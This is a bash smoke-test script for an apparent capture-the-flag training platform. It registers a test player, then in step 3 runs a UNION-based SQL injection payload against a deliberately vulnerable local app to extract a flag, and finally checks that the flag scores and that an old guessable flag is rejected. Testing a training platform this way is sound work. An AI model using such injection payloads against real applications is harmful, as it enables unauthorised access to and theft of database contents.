#!/bin/bash
# Live end-to-end smoke: exploit sqli-01 through the running vuln-app,
# then submit the extracted flag to the backend and confirm it scores.
set -euo pipefail

API=http://localhost:8000
VULN=http://localhost:3001

echo "1. health checks"
curl -fsS "$API/api/v1/health" >/dev/null && echo "   backend OK"
curl -fsS "$VULN/health" >/dev/null && echo "   vuln-app OK"

echo "2. register + login"
U="player_$RANDOM"
curl -fsS -X POST "$API/api/v1/auth/register" -H 'Content-Type: application/json' \
  -d "{\"username\":\"$U\",\"email\":\"$U@x.io\",\"password\":\"Passw0rd!23\"}" >/dev/null
TOKEN=$(curl -fsS -X POST "$API/api/v1/auth/login" -H 'Content-Type: application/json' \
  -d "{\"username\":\"$U\",\"password\":\"Passw0rd!23\"}" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
echo "   token acquired"

echo "3. exploit sqli-01 (UNION injection) to extract the flag"
INJ="1' UNION SELECT NULL, flag, NULL, NULL, NULL, NULL, NULL, NULL FROM challenge_flags WHERE challenge_id='sqli-01' -- "
FLAG=$(curl -fsS -G "$VULN/api/v1/sqli/01" --data-urlencode "id=$INJ" \
  | python3 -c 'import sys,json; d=json.load(sys.stdin); print(next(p["name"] for p in d["products"] if p.get("name","").startswith("BHEDA{")))')
echo "   extracted: $FLAG"

echo "4. resolve sqli-01 challenge id (deterministic UUID)"
CID=$(python3 -c "import uuid;print(uuid.uuid5(uuid.NAMESPACE_DNS,'bheda/challenge/sqli-01'))")
echo "   challenge id: $CID"

echo "5. submit extracted flag"
RESP=$(curl -fsS -X POST "$API/api/v1/submissions/" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d "{\"challenge_id\":\"$CID\",\"flag\":\"$FLAG\"}")
echo "   response: $RESP"
echo "$RESP" | python3 -c 'import sys,json; d=json.load(sys.stdin); assert d.get("correct") is True, d; print("   PASS: flag accepted, score=%s"%d.get("score"))'

echo "6. submit OLD guessable flag -> must be rejected"
RESP2=$(curl -fsS -X POST "$API/api/v1/submissions/" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d "{\"challenge_id\":\"$CID\",\"flag\":\"BHEDA{sqli_challenge_01}\"}")
echo "$RESP2" | python3 -c 'import sys,json; d=json.load(sys.stdin); assert d.get("correct") is not True or d.get("status")=="already_solved", d; print("   PASS: guessable flag handled (%s)"%d.get("status"))'

echo "ALL SMOKE CHECKS PASSED"
